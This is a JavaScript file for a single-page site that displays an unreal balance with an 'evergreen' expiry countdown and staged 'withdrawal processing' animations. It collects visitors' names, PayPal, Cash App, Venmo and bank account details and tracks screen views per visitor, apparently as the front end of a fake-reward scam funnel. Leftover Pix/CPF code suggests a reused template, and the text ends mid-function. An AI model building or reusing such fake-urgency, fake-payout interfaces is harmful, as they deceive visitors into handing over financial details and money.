/* main.js — SPA router + contadores + loader + modal popup (abre 3s em #dashboard)
   Versão unificada: o schedulePopupForOne() está no mesmo escopo de showScreen().
*/
(function () {
  /* ---------------------------
     Variáveis / helpers de modal
     --------------------------- */
  let modalTimer = null;
  let activeModalId = null;

  function showModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    activeModalId = id;
    modal.classList.add("is-modal", "is-active");
    modal.removeAttribute("aria-hidden");

    // Captura a posição atual do scroll APENAS se ainda não estiver travado
    if (!document.body.classList.contains("modal-open")) {
      const scrollY = window.scrollY;
      document.body.style.position = "fixed";
      document.body.style.top = `-${scrollY}px`;
      document.body.style.width = "100%";

      document.body.classList.add("modal-open");
      document.documentElement.classList.add("modal-open");
    }

    // Auto-dismiss do popup #two após 5s se o usuário não clicar
    if (id === "two") {
      setTimeout(() => {
        const still = document.getElementById("two");
        if (still && still.classList.contains("is-active")) {
          
        }
      }, 5000);
    }

    // Habilita o botão .btn-sacar em #dashboard somente quando o primeiro popup (id="two") abrir
    if (id === "two") {
      const btnOneSacar = document.querySelector(
        "#dashboard .btn-sacar"
      );
      if (btnOneSacar) {
        btnOneSacar.removeAttribute("disabled");
        btnOneSacar.style.pointerEvents = "auto";
        btnOneSacar.style.opacity = "";
      }

      // Anima o contador do popup quando ele for exibido
      setTimeout(() => {
        const popupCounter = modal.querySelector(
          ".valor-currency[data-amount-target]"
        );
        if (
          popupCounter &&
          typeof window.animateCurrencyCounter === "function"
        ) {
          // Reseta o texto para 0 antes de animar e força re-animação
          popupCounter.textContent = "$0.00";
          window.animateCurrencyCounter(popupCounter, true); // true = forceReset
        }
      }, 50);
    }

    // overlay click: fecha ao clicar fora do modal-inner (exceto #two)
    function overlayClickHandler(ev) {
      if (id === "two") return;
      const inner = modal.querySelector(".modal-inner");
      if (inner && inner.contains(ev.target)) return;
      closeModal(id);
    }
    modal.addEventListener("click", overlayClickHandler);
    modal._overlayHandler = overlayClickHandler;

    // fechar por botões com data-modal-close
    const closeButtons = Array.from(
      modal.querySelectorAll("[data-modal-close]")
    );
    modal._closeButtonHandlers = closeButtons.map((btn) => {
      const h = (ev) => {
        ev && ev.preventDefault();
        closeModal(id);
      };
      btn.addEventListener("click", h);
      return { btn, h };
    });

    // foco para primeiro elemento do modal
    const focusable = modal.querySelector(
      'button, a, input, [tabindex]:not([tabindex="-1"])'
    );
    if (focusable) focusable.focus();
  }

  function closeModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    if (modal._overlayHandler)
      modal.removeEventListener("click", modal._overlayHandler);
    if (modal._closeButtonHandlers) {
      modal._closeButtonHandlers.forEach(({ btn, h }) =>
        btn.removeEventListener("click", h)
      );
    }

    modal.classList.remove("is-active", "is-modal");
    modal.setAttribute("aria-hidden", "true");

    // Verifica se ainda existe algum modal aberto
    const remainingModals = document.querySelectorAll(
      ".screen.is-modal.is-active"
    );
    if (remainingModals.length === 0) {
      // Só destrava se não houver mais nenhum modal
      const scrollY = document.body.style.top;
      document.body.style.position = "";
      document.body.style.top = "";
      document.body.style.width = "";
      window.scrollTo(0, parseInt(scrollY || "0") * -1);

      document.body.classList.remove("modal-open");
      document.documentElement.classList.remove("modal-open");
    }

    activeModalId = null;

    // foco volta pra #dashboard se existir
    const screenOne = document.getElementById("dashboard");
    if (screenOne) {
      const f = screenOne.querySelector(
        'button, a, input, [tabindex]:not([tabindex="-1"])'
      );
      if (f) f.focus();
    }
  }

  function schedulePopupForOne() {
    clearModalTimer();
    // Enable Withdraw button in saldo card
    const btnOneSacar = document.querySelector("#dashboard .btn-sacar");
    if (btnOneSacar) {
      btnOneSacar.removeAttribute("disabled");
      btnOneSacar.style.pointerEvents = "auto";
      btnOneSacar.style.opacity = "";
    }
  }

  function clearModalTimer() {
    if (modalTimer) {
      clearTimeout(modalTimer);
      modalTimer = null;
    }
  }

  // limpa timer ao sair da página
  window.addEventListener("beforeunload", clearModalTimer);

  /* ---------------------------
     Contadores (evergreen) — mantidos
     --------------------------- */
  function iniciarContadorInline(tempoTotal) {
    const timerElement = document.getElementById("timer");
    const textElement = document.getElementById("countdown-text");
    if (!timerElement || !textElement) return;

    let tempoRestante = tempoTotal;
    let contador = setInterval(() => {
      if (tempoRestante < 0) {
        clearInterval(contador);
        textElement.textContent = "YOUR BALANCE HAS EXPIRED";
        return;
      }
      let minutos = Math.floor(tempoRestante / 60);
      let segundos = tempoRestante % 60;
      timerElement.textContent = `00 - ${String(minutos).padStart(
        2,
        "0"
      )} - ${String(segundos).padStart(2, "0")}`;
      tempoRestante--;
    }, 1000);
  }

  function iniciarContadorPopup(tempoTotal) {
    const todosOsTimersPopup = document.querySelectorAll(".expira-em-popup");
    if (!todosOsTimersPopup.length) return;

    todosOsTimersPopup.forEach((timerContainer, index) => {
      const minutesElement = timerContainer.querySelector(
        '[data-timer="minutes"]'
      );
      const secondsElement = timerContainer.querySelector(
        '[data-timer="seconds"]'
      );
      const labelElement = timerContainer.querySelector(".timer-label");
      if (!minutesElement || !secondsElement || !labelElement) return;

      let tempoRestante = tempoTotal;
      let contador = setInterval(() => {
        if (tempoRestante < 0) {
          clearInterval(contador);
          labelElement.textContent = "Expired";
          minutesElement.textContent = "00";
          secondsElement.textContent = "00";
          return;
        }
        let minutos = Math.floor(tempoRestante / 60);
        let segundos = tempoRestante % 60;
        minutesElement.textContent = String(minutos).padStart(2, "0");
        secondsElement.textContent = String(segundos).padStart(2, "0");
        tempoRestante--;
      }, 1000);
    });
  }

  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  let loaderState = {
    timeouts: [],
    interval: null,
  };

  function resetLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    // Clear all scheduled timeouts
    loaderState.timeouts.forEach((t) => clearTimeout(t));
    loaderState.timeouts = [];

    if (loaderState.interval) {
      clearInterval(loaderState.interval);
      loaderState.interval = null;
    }

    // Reset UI
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
    loadingText.textContent = "Starting...";
    loadingText.style.opacity = "1";
  }

  function startLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    resetLoader(); // Ensure clean state

    const steps = [
      { text: "Validating your information", progress: 25 },
      { text: "Completing withdrawal", progress: 50 },
      { text: "Processing transaction", progress: 75 },
      { text: "Finalizing", progress: 100 },
    ];
    const stepDuration = 3000,
      textFadeDuration = 400,
      dotAnimationSpeed = 800;

    let currentStep = 0;

    // Restore transition
    // Force reflow before adding transition back
    void progressBar.offsetWidth;
    progressBar.style.transition = `width ${stepDuration / 1000}s linear`;

    function scheduleNextStep() {
      if (currentStep < steps.length) {
        if (loaderState.interval) clearInterval(loaderState.interval);

        loadingText.style.opacity = 0;

        const t1 = setTimeout(() => {
          const step = steps[currentStep];
          const baseText = step.text;
          loadingText.textContent = baseText;
          // Calcula a largura considerando o padding de 20px de cada lado
          const containerWidth = progressBar.parentElement.offsetWidth - 40; // 20px de cada lado
          progressBar.style.width =
            (containerWidth * step.progress) / 100 + "px";
          loadingText.style.opacity = 1;

          let dotCount = 0;
          loaderState.interval = setInterval(() => {
            dotCount = (dotCount % 3) + 1;
            loadingText.textContent = baseText + ".".repeat(dotCount);
          }, dotAnimationSpeed);

          currentStep++;
          const t2 = setTimeout(scheduleNextStep, stepDuration);
          loaderState.timeouts.push(t2);
        }, textFadeDuration);
        loaderState.timeouts.push(t1);
      } else {
        if (loaderState.interval) clearInterval(loaderState.interval);
        loadingText.style.opacity = 0;

        const t3 = setTimeout(() => {
          loadingText.textContent = "Withdrawal Complete!";
          loadingText.style.opacity = 1;
        }, textFadeDuration);
        loaderState.timeouts.push(t3);
      }
    }

    // Start
    const tStart = setTimeout(scheduleNextStep, 500);
    loaderState.timeouts.push(tStart);
  }

  // Expose globally
  window.startLoader = startLoader;
  window.resetLoader = resetLoader;

  /* ---------------------------
     Nova animação de loading (#processing)
     --------------------------- */
  /* ---------------------------
     Nova animação de loading (#processing)
     --------------------------- */
  let newLoadingState = {
    interval: null,
    timeouts: [],
  };

  function startNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (!loadingText || !progressBar) return;

    // Reset state
    resetNewLoadingAnimation();

    // Force faster transition to match new speed
    progressBar.style.transition = "width 1.3s ease-in-out";

    const texts = [
      "Validating data...",
      "Connecting to server...",
      "Completing redemption...",
      "Almost done...",
    ];

    // Set initial text immediately
    loadingText.textContent = texts[0];

    let currentIndex = 0;
    const totalSteps = texts.length;
    const progressPerStep = 100 / totalSteps;

    function updateProgress() {
      const progress = (currentIndex + 1) * progressPerStep;
      progressBar.style.width = `${progress}%`;
    }

    // Inicializar progresso
    updateProgress();

    function changeText() {
      loadingText.style.opacity = 0;

      const t1 = setTimeout(() => {
        currentIndex++;
        loadingText.textContent = texts[currentIndex];
        loadingText.style.opacity = 1;

        // Atualizar progresso com transição suave
        updateProgress();
      }, 150);
      newLoadingState.timeouts.push(t1);
    }

    // Loop de textos
    newLoadingState.interval = setInterval(() => {
      if (currentIndex >= totalSteps - 1) {
        // Chegou no último passo ("Almost done...")
        clearInterval(newLoadingState.interval);

        // Finaliza e redireciona
        const tEnd = setTimeout(() => {
          if (typeof window.showScreen === "function") {
            window.showScreen("checkout");
          } else {
            location.hash = "#checkout";
          }
        }, 700);
        newLoadingState.timeouts.push(tEnd);
        return;
      }
      changeText();
    }, 1600);
  }

  function resetNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (newLoadingState.interval) {
      clearInterval(newLoadingState.interval);
      newLoadingState.interval = null;
    }
    newLoadingState.timeouts.forEach((t) => clearTimeout(t));
    newLoadingState.timeouts = [];

    if (loadingText) {
      loadingText.textContent = "Validating access...";
      loadingText.style.opacity = 1;
    }
    if (progressBar) {
      progressBar.style.transition = "none";
      progressBar.style.width = "0%";
      // Força reflow
      void progressBar.offsetWidth;
      progressBar.style.transition =
        "width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)";
    }
  }

  // Expose globally
  window.startNewLoadingAnimation = startNewLoadingAnimation;
  window.resetNewLoadingAnimation = resetNewLoadingAnimation;

  /* ---------------------------
     Função para preencher página de confirmação (#checkout)
     --------------------------- */
  function fillConfirmationPage() {
    // Tenta pegar do objeto global ou do localStorage
    let formData = window.__formData;
    if (!formData) {
      try {
        const stored = localStorage.getItem("userACHData");
        if (stored) {
          formData = JSON.parse(stored);
        }
      } catch (e) {
        console.error("Erro ao ler localStorage", e);
      }
    }

    if (!formData) return;

    // Função para formatar data atual
    function getCurrentDate() {
      const now = new Date();
      const day = String(now.getDate()).padStart(2, "0");
      const month = String(now.getMonth() + 1).padStart(2, "0");
      const year = now.getFullYear();
      return `${day}/${month}/${year}`;
    }

    // Preenche o nome
    const nameElement = document.getElementById("confirmation-name");
    if (nameElement && formData.nome) {
      nameElement.textContent = formData.nome;
    }

    // Preenche a data atual
    const dateElement = document.getElementById("confirmation-date");
    if (dateElement) {
      dateElement.textContent = getCurrentDate();
    }

    // Preenche o tipo de chave PIX
    const keyTypeElement = document.getElementById("confirmation-key-type");
    if (keyTypeElement && formData.tipoChave) {
      keyTypeElement.textContent = formData.tipoChave;
    }

    // Preenche a chave digitada
    const pixKeyElement = document.getElementById("confirmation-pix-key");
    if (pixKeyElement && formData.chavePix) {
      // O valor já deve estar formatado do input, mas garante formatação se necessário
      let formattedKey = formData.chavePix;

      if (formData.tipoChave === "Checking" || formData.tipoChave === "Savings") {
        // Keep account number as-is
      }
      // For PayPal Email and Zelle Email, keep as-is

      pixKeyElement.textContent = formattedKey;
    }
  }

  // Expose globally
  window.fillConfirmationPage = fillConfirmationPage;

  /* ---------------------------
     SPA Router (inicia screens e navegação)
     --------------------------- */
  function initRouter() {
    const screens = Array.from(document.querySelectorAll("#screens .screen"));
    if (!screens.length) return;

    function showScreen(id, push = true) {
      const target = document.getElementById(id);
      if (!target) {
        console.warn(`Screen "${id}" not found.`);
        return;
      }

      screens.forEach((s) => {
        if (s === target) {
          s.classList.add("is-active");
          s.removeAttribute("aria-hidden");
        } else {
          s.classList.remove("is-active");
          s.setAttribute("aria-hidden", "true");
        }
      });

      // Marca a tela vista para o dashboard (via worker /api/event, que loga no
      // RunPod). Uma vez por tela por sessao — o session_key e derivado no
      // worker de ip+ua, entao nao precisa mandar sk aqui.

      if (push) {
        try {
          history.pushState({ screen: id }, "", "#" + id);
        } catch (e) {
          location.hash = id;
        }
      }

      // Scroll to top when showing a new screen
      window.scrollTo(0, 0);
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;

      // Para #checkout, força scroll para o topo após renderização
      if (id === "checkout") {
        // Scroll imediato
        window.scrollTo({ top: 0, left: 0, behavior: "instant" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Scroll novamente após renderização para garantir
        setTimeout(() => {
          window.scrollTo({ top: 0, left: 0, behavior: "instant" });
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("checkout");
          if (nineElement) {
            nineElement.scrollTop = 0;
            // Também força scroll no container se houver
            const container = nineElement.querySelector(
              ".confirmation-container"
            );
            if (container) {
              container.scrollTop = 0;
            }
          }
        }, 100);
      }

      const focusable = target.querySelector(
        'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      if (focusable) focusable.focus({ preventScroll: true });

      // >>> Aqui garantimos que o popup seja agendado quando entrarmos em #dashboard
      if (id === "dashboard") {
        schedulePopupForOne();
      } else {
        clearModalTimer();

        // Garante que o sticky popup suma ao sair da #dashboard
        const stickyPopup = document.getElementById("popup-um");
        if (stickyPopup) {
          stickyPopup.classList.remove("is-visible");
        }

        // Se for para #processing, fecha todos os modais e inicia novo loader
        if (id === "processing") {
          const modalIds = [];
          modalIds.forEach((modalId) => {
            const modal = document.getElementById(modalId);
            if (modal && modal.classList.contains("is-modal")) {
              closeModal(modalId);
            }
          });
          // Inicia a nova animação de loading
          if (typeof startNewLoadingAnimation === "function") {
            startNewLoadingAnimation();
          }
        } else {
          // Se não for #processing, reseta o loader
          if (typeof window.resetLoader === "function") {
            window.resetLoader();
          }

          // Reseta a nova animação de loading se estiver ativa
          if (typeof resetNewLoadingAnimation === "function") {
            resetNewLoadingAnimation();
          }

          if (activeModalId) {
            closeModal(activeModalId);
          }
        }
      }

      // Anima contador da tela #withdraw quando ela for exibida
      if (
        id === "withdraw" &&
        typeof window.animateCurrencyCounter === "function"
      ) {
        // Usa um timeout maior para garantir que a tela está totalmente renderizada
        // e cancela qualquer timeout anterior para evitar múltiplas animações
        if (target._threeAnimationTimeout) {
          clearTimeout(target._threeAnimationTimeout);
        }
        target._threeAnimationTimeout = setTimeout(() => {
          const threeCounter = target.querySelector(
            ".valor-currency[data-amount-target]"
          );
          if (threeCounter) {
            // Garante que o elemento ainda está visível antes de animar
            if (target.classList.contains("is-active")) {
              window.animateCurrencyCounter(threeCounter, true); // true = forceReset
            }
          }
          target._threeAnimationTimeout = null;
        }, 100);
      }

      // Preenche dados na página de confirmação (#checkout) quando ela for exibida
      if (id === "checkout") {
        // Garante que a página apareça no topo
        window.scrollTo(0, 0);
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Preenche imediatamente para evitar flash de conteúdo vazio
        fillConfirmationPage();

        setTimeout(() => {
          // Força scroll para o topo novamente após renderização
          window.scrollTo(0, 0);
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("checkout");
          if (nineElement) {
            nineElement.scrollTop = 0;
          }

          // Animação do saldo (pode ficar no timeout ou fora, mas fora é mais garantido de iniciar logo)
          const confirmationBalance = document.querySelector(
            ".confirmation-balance-amount[data-amount-target]"
          );
          if (
            confirmationBalance &&
            typeof window.animateCurrencyCounter === "function"
          ) {
            window.animateCurrencyCounter(confirmationBalance, true);
          }
        }, 150);
      }
    }

    window.addEventListener("popstate", (ev) => {
      const id =
        (ev.state && ev.state.screen) ||
        location.hash.replace("#", "") ||
        screens[0].id;
      showScreen(id, /*push*/ false);
    });

    // inicial: usa hash ou primeira screen
    const initial = location.hash.replace("#", "") || screens[0].id;
    showScreen(initial, /*push*/ false);

    // expõe globalmente se precisar (útil pra debugging)
    window.showScreen = showScreen;
  }

  // Se preferir JS: torna o botão .btn-sacar um link para a screen 'withdraw'

  document.addEventListener("DOMContentLoaded", () => {
    const btnSacar =
      document.querySelector("#dashboard .btn-sacar") ||
      document.querySelector(".btn-sacar");
    if (btnSacar) {
      btnSacar.addEventListener("click", function (ev) {
        ev.preventDefault();
        // fecha modal/timers caso haja algum aberto (opcional)
        if (typeof clearModalTimer === "function") clearModalTimer();
        if (typeof closeModal === "function" && activeModalId)
          closeModal(activeModalId);

        // usa a função global do router para trocar de tela
        if (typeof window.showScreen === "function") {
          window.showScreen("withdraw");
        } else {
          // fallback: altera hash
          location.hash = "#withdraw";
        }
      });
    }
  });

  /* ---------------------------
     Inicialização
     --------------------------- */
  document.addEventListener("DOMContentLoaded", () => {
    initRouter();

    // iniciadores de contador (evergreen) — ajuste o tempo aqui se quiser
    const tempoInicialEmSegundos = 16 * 60 + 38;
    iniciarContadorInline(tempoInicialEmSegundos);
    iniciarContadorPopup(tempoInicialEmSegundos);

    // initLoaderIfExists(); // Removido para iniciar apenas no #processing

    // initStickyPopup(); // popup removido

    // Garante que o popup inicial seja agendado se estivermos na #dashboard
    const currentHash = location.hash.replace("#", "") || "loading";
    if (currentHash === "dashboard") {
      schedulePopupForOne();
    }
  });

  /* ---------------------------
     Sticky Popup Logic
     --------------------------- */
  function initStickyPopup() {
    const saldoSection = document.querySelector("#dashboard .saldo");
    const stickyPopup = document.getElementById("popup-um");
    const screenOne = document.getElementById("dashboard");

    if (!saldoSection || !stickyPopup || !screenOne) return;

    // Configura botão de sacar do popup para funcionar igual ao principal
    const btnSacarPopup = stickyPopup.querySelector(".btn-sacar");
    if (btnSacarPopup) {
      btnSacarPopup.addEventListener("click", (ev) => {
        ev.preventDefault();
        if (typeof window.showScreen === "function") {
          window.showScreen("withdraw");
        } else {
          location.hash = "#withdraw";
        }
      });
    }

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // Se .saldo NÃO está intersectando (saiu da tela) E #dashboard está ativo
          if (
            !entry.isIntersecting &&
            screenOne.classList.contains("is-active")
          ) {
            stickyPopup.classList.add("is-visible");
          } else {
            stickyPopup.classList.remove("is-visible");
          }
        });
      },
      {
        threshold: 0, // Dispara assim que qualquer parte sair/entrar
        rootMargin: "-50px 0px 0px 0px", // Ajuste fino para disparar um pouco antes de sumir totalmente
      }
    );

    observer.observe(saldoSection);

    // Expõe para ser usado no router
    window.__stickyObserver = observer;
  }

  // expõe helpers para caso queira manipular modal manualmente em console
  window.__spa_modal_helpers = {
    schedulePopupForOne,
    clearModalTimer,
    showModal,
    closeModal,
  };

  /* ===== Dynamic Payment Method Form Handler ===== */
  let currentPaymentMethod = "paypal";

  function checkNewFormValidity() {
    const btnEnviar = document.getElementById("btn-enviar-pix");
    if (!btnEnviar) return;
    const nomeEl = document.getElementById("nome");
    const nomeFilled = nomeEl && nomeEl.value.trim().length > 1;
    let payFilled = false;
    if (currentPaymentMethod === "paypal") {
      const el = document.getElementById("paypal-email");
      payFilled = el && el.value.trim().includes("@");
    } else if (currentPaymentMethod === "cashapp") {
      const el = document.getElementById("cashapp-handle");
      payFilled = el && el.value.trim().length > 1;
    } else if (currentPaymentMethod === "venmo") {
      const el = document.getElementById("venmo-handle");
      payFilled = el && el.value.trim().length > 1;
    }
    if (nomeFilled && payFilled) {
      btnEnviar.classList.remove("btn-disabled");
    } else {
      btnEnviar.classList.add("btn-disabled");
    }
  }

  function showPaymentMethodForm(method) {
    currentPaymentMethod = method || "paypal";

    // Hide all groups first
    const allGroups = ["name-group","paypal-group","cashapp-group","venmo-group","bank-group","routing-group","account-group"];
    allGroups.forEach(id => { const el = document.getElementById(id); if (el) el.style.display = "none"; });

    const titleEl = document.getElementById("form-title");

    // Show appropriate fields based on payment method
    switch (currentPaymentMethod) {
      case "paypal":
        if (titleEl) titleEl.textContent = "PayPal Details";
        document.getElementById("name-group").style.display = "block";
        document.getElementById("paypal-group").style.display = "block";
        break;
      case "cashapp":
        if (titleEl) titleEl.textContent = "Cash App Details";
        document.getElementById("name-group").style.display = "block";
        document.getElementById("cashapp-group").style.display = "block";
        break;
      case "venmo":
        if (titleEl) titleEl.textContent = "Venmo Details";
        document.getElementById("name-group").style.display = "block";
        document.getElementById("venmo-group").style.display = "block";
        break;
      default:
        if (titleEl) titleEl.textContent = "Add Account Details";
    }

    // Clear all inputs
    ["nome","paypal-email","cashapp-handle","venmo-handle","bank-name","routing-number","account-number"].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.value = "";
    });

    // Attach live-validation listeners (idempotent via named handler)
    const nomeEl = document.getElementById("nome");
    if (nomeEl) nomeEl.addEventListener("input", checkNewFormValidity);
    ["paypal-email","cashapp-handle","venmo-handle"].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.addEventListener("input", checkNewFormValidity);
    });

    // Start disabled until both fields are filled
    const btnEnviar = document.getElementById("btn-enviar-pix");
    if (btnEnviar) btnEnviar.classList.add("btn-disabled");
  }

  // Expose so second IIFE can call it
  window.__showPaymentMethodForm = showPaymentMethodForm;

  // Listener: pick payment method inside #five
  document.body.addEventListener("click", function (ev) {
    const item = ev.target.closest("[data-method-pick]");
    if (!item) return;
    ev.preventDefault();
    ev.stopPropagation();
    const method = item.getAttribute("data-method-pick");
    const methodSel = document.getElementById("five-method-select");
    const formCon = document.getElementById("five-form-container");
    if (methodSel) methodSel.style.display = "none";
    if (formCon) formCon.style.display = "";
    showPaymentMethodForm(method);
  });

  // Back button in #five: if form is showing, go back to method select instead of closing
  const fiveBackBtn = document.getElementById("five-back-btn");
  if (fiveBackBtn) {
    fiveBackBtn.addEventListener("click", function (ev) {
      const formCon = document.getElementById("five-form-container");
      const methodSel = document.getElementById("five-method-select");
      const formTitle = document.getElementById("form-title");
      if (formCon && formCon.style.display !== "none") {
        ev.preventDefault();
        ev.stopPropagation();
        formCon.style.display = "none";
        if (methodSel) methodSel.style.display = "";
        if (formTitle) formTitle.textContent = "Add withdrawal method";
      }
      // else: default data-modal-close behavior closes the modal
    }, true); // capture phase to run before the generic close handler
  }

  /* ===== Helpers para preset/reset do formulário #five ===== */
  function presetFiveForm(type) {
    const selectorText = document.getElementById("pix-selector-text");
    const keyInput = document.getElementById("pix-key-input");
    const keyWrapper = document.getElementById("pix-key-wrapper");
    const typeGroup = document.getElementById("five-type-form-group");
    const keyLabel = document.getElementById("five-key-label");
    const selector = document.getElementById("pix-type-selector");
    const nomeInput = document.getElementById("nome");
    const typeToId = { "Checking":"key-cpf","Savings":"key-email","PayPal Email":"key-celular","Zelle Email":"key-aleatoria" };

    if (nomeInput) nomeInput.value = "";
    if (selectorText) { selectorText.textContent = type; selectorText.style.color = "#000"; }
    if (typeGroup) typeGroup.style.display = "none";
    if (keyLabel) keyLabel.textContent = "Email Address";
    if (keyInput) {
      keyInput.value = "";
      keyInput.removeAttribute("disabled");
      keyInput.classList.remove("input-disabled");
      keyInput.placeholder = type === "PayPal Email" ? "Enter your PayPal email" : "Enter your Zelle email";
    }
    if (keyWrapper) keyWrapper.classList.remove("input-wrapper-disabled");
    if (selector) selector.classList.remove("input-error", "shake-animation");
    const radioId = typeToId[type];
    if (radioId) { const r = document.getElementById(radioId); if (r) r.checked = true; }
    checkPixFormValidity();
  }

  function resetFiveForm() {
    const selectorText = document.getElementById("pix-selector-text");
    const keyInput = document.getElementById("pix-key-input");
    const keyWrapper = document.getElementById("pix-key-wrapper");
    const typeGroup = document.getElementById("five-type-form-group");
    const keyLabel = document.getElementById("five-key-label");
    const nomeInput = document.getElementById("nome");

    if (nomeInput) nomeInput.value = "";
    if (selectorText) { selectorText.textContent = "Choose account type"; selectorText.style.color = ""; }
    if (typeGroup) typeGroup.style.display = "";
    if (keyLabel) keyLabel.textContent = "Account Number";
    if (keyInput) {
      keyInput.value = "";
      keyInput.setAttribute("disabled", "");
      keyInput.classList.add("input-disabled");
      keyInput.placeholder = "Enter account number";
    }
    if (keyWrapper) keyWrapper.classList.add("input-wrapper-disabled");
    checkPixFormValidity();
  }

  /* ===== Delegação para botões que fecham modal (funciona mesmo se botão não tiver listener) ===== */
  document.body.addEventListener("click", function (ev) {
    const btn = ev.target.closest("[data-modal-close]");
    if (!btn) return;
    ev.preventDefault();

    // procura o modal ancestor (section com class "screen")
    const modalAncestor = btn.closest(".screen");
    const modalId = modalAncestor ? modalAncestor.id : "two";

    // Se closeModal estiver no escopo (dentro da IIFE), usa diretamente.
    // Caso use outra instância, tenta o helper exposto window.__spa_modal_helpers.closeModal
    if (typeof closeModal === "function") {
      closeModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal(modalId);
    } else {
      // fallback: tenta esconder a section manualmente
      const modalEl = document.getElementById(modalId);
      if (modalEl) {
        modalEl.classList.remove("is-active", "is-modal");
        modalEl.setAttribute("aria-hidden", "true");
        document.body.classList.remove("modal-open");
      }
    }
  });

  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  document.body.addEventListener("click", function (ev) {
    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Preset/reset do formulário #five baseado no método de pagamento clicado
    if (modalId === "five") {
      const paymentMethod = opener.getAttribute("data-payment-method");
      const preset = opener.getAttribute("data-payment-preset");

      if (paymentMethod) {
        // Nova lógica: mostrar/esconder campos dinâmicamente
        showPaymentMethodForm(paymentMethod);
      } else if (preset) {
        presetFiveForm(preset);
      } else {
        resetFiveForm();
      }
    }

    // Lógica específica para abrir o modal de seleção de tipo (#six)
    if (modalId === "six") {
      const selectorText = document.getElementById("pix-selector-text");
      if (selectorText) {
        const currentType = selectorText.textContent.trim();

        // Mapeamento de Texto -> ID do Radio
        const typeToId = {
          "Checking": "key-cpf",
          "Savings": "key-email",
          "PayPal Email": "key-celular",
          "Zelle Email": "key-aleatoria",
        };

        const radioId = typeToId[currentType];
        if (radioId) {
          const radio = document.getElementById(radioId);
          if (radio) radio.checked = true;
        }
      }
    }

    // Abre o modal usando a função showModal
    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  // Suporte para tecla Enter no pix-item (acessibilidade)
  document.body.addEventListener("keydown", function (ev) {
    if (ev.key !== "Enter" && ev.key !== " ") return;

    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    if (modalId === "five") {
      const paymentMethod = opener.getAttribute("data-payment-method");
      const preset = opener.getAttribute("data-payment-preset");

      if (paymentMethod) {
        showPaymentMethodForm(paymentMethod);
      } else if (preset) {
        presetFiveForm(preset);
      } else {
        resetFiveForm();
      }
    }

    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  /* ===== Função para fechar todos os modais abertos ===== */
  function closeAllModals() {
    const modalIds = [];
    modalIds.forEach((modalId) => {
      const modal = document.getElementById(modalId);
      if (modal && modal.classList.contains("is-modal")) {
        if (typeof closeModal === "function") {
          closeModal(modalId);
        } else if (
          window.__spa_modal_helpers &&
          typeof window.__spa_modal_helpers.closeModal === "function"
        ) {
          window.__spa_modal_helpers.closeModal(modalId);
        } else {
          // fallback: fecha manualmente
          modal.classList.remove("is-active", "is-modal");
          modal.setAttribute("aria-hidden", "true");
          document.body.classList.remove("modal-open");
        }
      }
    });
    activeModalId = null;
  }

  /* ===== Lógica de Seleção de Chave e Validação ===== */

  // Helpers de Validação
  function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let soma = 0,
      resto;
    for (let i = 1; i <= 9; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    soma = 0;
    for (let i = 1; i <= 10; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    return resto === parseInt(cpf.substring(10, 11));
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, "");
    return cleanPhone.length >= 10 && cleanPhone.length <= 11;
  }

  function validateRandomKey(key) {
    // Validação simplificada de UUID (32 hex chars + 4 hifens = 36 chars)
    // Formato: 8-4-4-4-12
    return /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(
      key
    );
  }

  // Função de validação geral
  function checkPixFormValidity() {
    const nomeInput = document.getElementById("nome");
    const keyInput = document.getElementById("pix-key-input");
